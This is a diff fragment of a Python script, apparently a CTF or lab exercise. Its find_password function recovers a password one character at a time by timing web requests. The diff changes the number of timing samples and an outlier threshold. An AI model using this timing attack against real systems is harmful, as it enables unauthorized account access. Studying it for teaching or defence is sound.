@@ -81,10 +81,10 @@ def find_password(length):
         for i in range(len(POOL)):
             url1 = url + '/' + (passw + POOL[i] + "_" * (length - 1 - j))
             print(f'checking for: {url1}')
-            checks.append(min(timeit(url1, 2)))
+            checks.append(min(timeit(url1, 5)))
             print(f'min time {checks[-1]}')
             goodDict[POOL[i]] = checks[-1]
-        goodDict = outliers(goodDict, 0.2)
+        goodDict = outliers(goodDict, 1.3)
         if len(passw) != 3:
             passw += max(goodDict.keys(), key=(lambda k: goodDict[k]))
         else:
